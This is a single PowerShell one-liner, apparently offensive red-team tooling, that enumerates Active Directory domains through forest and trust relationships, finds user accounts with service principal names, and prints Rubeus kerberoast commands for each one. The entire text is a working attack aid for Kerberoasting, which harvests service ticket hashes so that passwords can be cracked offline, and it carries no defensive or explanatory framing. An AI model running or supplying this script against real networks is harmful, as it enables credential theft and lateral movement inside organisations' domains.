$domains = @(); try { $domains += (Get-Forest).Domains.Name; $domains += (Get-Forest).GlobalCatalogs | % { $_.Domain } } catch {}; try { Get-DomainTrust -Domain (Get-Domain).Name | % { $domains += $_.TargetName; $domains += $_.SourceName } } catch {}; try { Get-DomainTrust | % { $domains += $_.TargetName; $domains += $_.SourceName } } catch {}; $domains += $env:USERDNSDOMAIN; $domains += (Get-Domain).Name; $domains = $domains | ? {$_ -and $_ -ne ''} | select -Unique; $domains | % { $d=$_; Write-Host "`n[*] $d" -f Yellow; try { Get-DomainUser -SPN -Domain $d 2>$null | ? {$_.samaccountname -ne "krbtgt"} | % { Write-Host ".\Rubeus.exe kerberoast /domain:$d /user:$($_.samaccountname) /nowrap" -f Green } } catch {} }
